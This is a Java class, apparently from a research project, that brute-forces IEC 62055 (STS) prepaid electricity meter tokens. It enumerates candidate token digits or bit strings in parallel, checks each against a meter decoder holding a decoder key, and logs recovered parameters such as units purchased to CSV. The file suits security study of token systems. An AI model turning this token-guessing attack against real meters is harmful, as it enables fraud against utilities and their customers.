package domain.attack;

import domain.Replacement;
import domain.mode.AttackMode;
import domain.mode.BitAttackMode;
import domain.mode.TokenAttackMode;
import domain.order.AttackOrder;
import domain.order.RandomAttackOrder;
import edu.cmu.iec62055meter.domain.TokenParameters;
import edu.cmu.iec62055meter.pos.Meter;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import timestamp.Tic;
import timestamp.Toc;
import utils.Utils;

import java.io.IOException;
import java.math.BigInteger;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by rmbitiru on 12/29/15.
 */
public abstract class Attacker {

    protected Replacement[] replacements ;
    protected String logFileOutputPath;
    protected int radix = 10 ; // default radix is 10
    private AttackMode attackMode ;
    private AttackOrder attackOrder ;
    private BigInteger rangeStart = new BigInteger("0", radix);
    private BigInteger rangeEnd = new BigInteger("0", radix);
    private String decoderKeyPath = "." ;
    private Logger logger = LogManager.getFormatterLogger("Attacker") ;
    private Meter meter ;

    /**
     * This method tests a number of tokens in the allowable range
     * to try and obtain valid tokens for a predefined range
     * The replacement values are inserted into the token to narrow
     * the values over which tokens can be guessed. Values that have been
     * set as replacement values are not modified over the course of
     * the tests
     */
    public void launchAttack() {
        try {
            logger.info("brute force attack launched...");

            Utils.openFile(logFileOutputPath);
            meter = new Meter(getDecoderKeyPath());

            // output checking vals
            final BigInteger PERIODIC_CHECK = new BigInteger("10001") ;
            final BigInteger CHECK_VALUE = new BigInteger("0") ;

            // create an executor thread pool
            ExecutorService executorService = Executors.newCachedThreadPool() ;

            for (BigInteger bi = getRangeStart(); bi.compareTo(getRangeEnd()) <= 0; bi = bi.add(BigInteger.ONE)) {

                final BigInteger vi = bi ;
                executorService.execute(new Runnable() {
                    @Override
                    public void run() {
                        /** LAUNCH THREAD **/
                        // logger.error("generated brute force attack token/66 bit string generated: " + vi);
                        String attackVector = ""; // bits or token digits used for the brute force attack
                        String generatedToken = ""; // token generated from the attack vector
                        boolean validTokenStatus = true; // specifies the results of validating the attack vector as valid
                        Tic allProcessingTic = new Tic();
                        TokenParameters generatedTokenParameters = null ;
                        String currOutputFile = ""; // output file to capture the log of the attack

                        // processing ---------
                        if (vi.mod(PERIODIC_CHECK).equals(CHECK_VALUE))  System.out.println(vi);

                        if (replacementsUnchanged(vi, replacements, radix)) { // make sure that replacements rules and positions are adhered to
                            attackVector = generatedToken = vi.toString();
                            Tic specificTokenProcessingTic = new Tic();
                            try {
                                generatedTokenParameters = getTokenParameters(attackVector);
                                displayDecodedTokenParameters(generatedTokenParameters, vi);
                            } catch (Exception e) {
                                validTokenStatus = false;
                                // logger.error("\t#Error. Generated token " + vi + " is not a valid token"); // !!!Reactivate to show not valid token
                                // e.printStackTrace();
                            } finally {
                                if (validTokenStatus) {
                                    Toc specificTokenProcessingToc = new Toc(specificTokenProcessingTic);
                                    Toc allTokenProcessingToc = new Toc(allProcessingTic);
                                    currOutputFile = formatTokenParams(attackVector,
                                            generatedToken,
                                            generatedTokenParameters,
                                            validTokenStatus,
                                            attackMode,
                                            attackOrder,
                                            specificTokenProcessingToc,
                                            allTokenProcessingToc);

                                    try {
                                        saveToFile(currOutputFile);
                                    } catch (IOException e) {}
                                }
                            }
                        } else
                            logger.error("\t#Invalid token generated");
                    }
                });


                /** END THREAD **/

            }

            executorService.shutdown();

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                Utils.closeFile(); // make sure log file is closed
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }


    public Replacement[] getReplacements() {
        return replacements;
    }

    public void setReplacements(Replacement[] replacements) {
        this.replacements = replacements;
    }

    public String getLogFileOutputPath() {
        return logFileOutputPath;
    }

    public void setLogFileOutputPath(String logFileOutputPath) {
        this.logFileOutputPath = logFileOutputPath;
    }

    /**
     * This method checks that the newly determined attack vector 'val'
     * does not create a token that defies the rules specifies
     * in the replacement values and positions
     *
     * @param val           attack vector
     * @param replacements  replacement values and positions
     * @param radix         the order of the BigInteger [2, 10]
     * @return whether the newly created token defies any of the
     * replacement values at the defined positions
     */
    private boolean replacementsUnchanged(BigInteger val, Replacement[] replacements, int radix) {
        for (int index = 0; index < replacements.length; index++) {
            Replacement currReplacement = replacements[index];
            if (currReplacement.getReplacement() != indexOf(val, currReplacement.getPosition(), radix))
                return false;
        }
        return true;
    }

    /**
     * This method formats the attack vector and parameter details
     * to a CSV string that can be serialized to a file
     *
     * <h4>CSV File output format</h4>
     * <pre>
     *     attack_vector,                               // the token or 66 bit APDU used for brute force attack
     *     generated token,                             // the generated token from the attack vector (useful when 66 bit APDU used)
     *     valid,                                       // flag indicating whether no token processing errors thrown
     *     valid_token_details,                         // the generated token details (class, subclass, TID, amount & CRC
     *     time_to_generate,                            // total time taken to process attack vector
     *     time_from_start_of_code_run,                 // specific time taken to decode 66 bit APDU or 20 digit token
     *     token_attack_mode,                           // flag specifying whether attack mode is token
     *     token_attack_order_random_or_sequential,     // flag specifying whether token attack mode's attack order is sequential or random
     *     token_attack_bits_known,                     // specific token digits known in attack vector
     *     bit_attack_mode,                             // flag specifying whether attack mode is bit
     *     bit_attack_sequential_random_token_blocks,   // flag specifying whether bit attack mode is sequential or random
     *     bit_attack_bits_or_tokens_known              // set of bits known in attack vector
     * </pre>
     *
     * @param tokenParameters parameters from decoded token
     * @param specificTokenProcessingToc Toc for processing specific token
     * @param allTokenProcessingToc Toc for processing all tokens
     * @return
     */
    public String formatTokenParams (String attackVector, String generatedToken,
                                      TokenParameters tokenParameters, boolean validTokenStatus,
                                      AttackMode attackMode, AttackOrder attackOrder,
                                      Toc specificTokenProcessingToc,
                                      Toc allTokenProcessingToc) {
        final String DELIMITER = "," ;
        final String EOL = "\n" ;
        return  attackVector + DELIMITER
                + generatedToken + DELIMITER
                + ((validTokenStatus) ? "T" : "F") + DELIMITER
                + tokenParameters.toString() + DELIMITER
                + specificTokenProcessingToc.getTimeDiff() + DELIMITER
                + allTokenProcessingToc.getTimeDiff() + DELIMITER
                + ((attackMode instanceof TokenAttackMode) ? "Y" : "") + DELIMITER
                + (((attackMode instanceof TokenAttackMode) && (attackOrder instanceof RandomAttackOrder)) ? "R" : "S") + DELIMITER
                + Utils.concat(getReplacements()) + DELIMITER
                + ((attackMode instanceof BitAttackMode) ? "Y" : "N") + DELIMITER
                + (((attackMode instanceof BitAttackMode) && (attackOrder instanceof RandomAttackOrder))  ? "R" : "S") + DELIMITER
                + ((attackMode instanceof BitAttackMode) ? Utils.concat(getReplacements()) : "" ) + EOL ;
    }

    /**
     * This method supplies the generated token to a meter
     * interface to determine if it is valid
     *
     * @param _20DigitToken represents the 20 digit token supplied
     * @return if the token is valid based on the generated
     * values from the generated token parameters
     */
    public TokenParameters getTokenParameters(String _20DigitToken)
        throws Exception {
        return meter.processToken(_20DigitToken);
    }

    /**
     * Saves line to file
     * @param line line of file to be written
     */
    public void saveToFile(String line)
        throws  IOException {
        Utils.writeToFile(line) ;
    }

    /**
     * Finds the location of a bit or digit in a 66 bit string
     * ot 20 digit token
     * @param haystack value from which to find distinct digit
     * @param position position at which to search for value in haysytack
     * @return whether the desired value was found in the entire string. If
     * the haystack string length is less than the desired positon,
     * then -1 is returned
     */
    private int indexOf(BigInteger haystack, int position, int radix) {
        String bigIntegerStr = haystack.toString(radix);
        if (position <= bigIntegerStr.length() - 1)
            return Integer.parseInt(bigIntegerStr.charAt(position) + "");
        else
            return -1 ;
    }

    /** Accessors for attack mode and order **/
    public AttackMode getAttackMode() {
        return attackMode;
    }

    public void setAttackMode(AttackMode attackMode) {
        this.attackMode = attackMode;
    }

    public AttackOrder getAttackOrder() {
        return attackOrder;
    }

    public void setAttackOrder(AttackOrder attackOrder) {
        this.attackOrder = attackOrder;
    }

    public BigInteger getRangeStart() {
        return rangeStart;
    }

    public void setRangeStart(BigInteger rangeStart) {
        this.rangeStart = rangeStart ;
    }

    public BigInteger getRangeEnd() {
        return rangeEnd;
    }

    public void setRangeEnd(BigInteger rangeEnd) {
        this.rangeEnd = rangeEnd ;
    }

    public int getRadix () {
        return radix ;
    }

    public void setRadix(int radix) {
        this.radix = radix ;
    }

    public String getDecoderKeyPath () {
        return decoderKeyPath ;
    }

    public void setDecoderKeyPath (String decoderKeyPath) {
        this.decoderKeyPath = decoderKeyPath ;
    }

    /**
     * Displays generated token parameters if the generated
     * token is valid.
     * @param parameters
     */
    private void displayDecodedTokenParameters(TokenParameters parameters, BigInteger attackValue) {
        Date dateOfIssue = parameters.getDateOfIssue().toDate() ;
        System.out.printf("-------------------------------\n" +
                        "Recovered Token parameters: \n" +
                        "attack token/bitstring: %s\n" +
                        "Token class: %s \n" +
                        "Token subclass: %s\n" +
                        "random value: %s\n" +
                        "Date Of Issue: %ta %tb %td %tT %tZ %tY \n" +
                        "Units Purchased: %f\n" +
                        "CRC: %s" +
                        "\n-------------------------------\n",
                attackValue.toString(radix),
                parameters.getTokenClass().getType().getBitSequence(),
                parameters.getTokenSubClass().getType().getBitSequence(),
                parameters.getRandomNo().getBitString(),
                dateOfIssue,
                dateOfIssue,
                dateOfIssue,
                dateOfIssue,
                dateOfIssue,
                dateOfIssue,
                parameters.getAmount().getAmountPurchased(),
                parameters.getCRC().getBitString());
    }
}
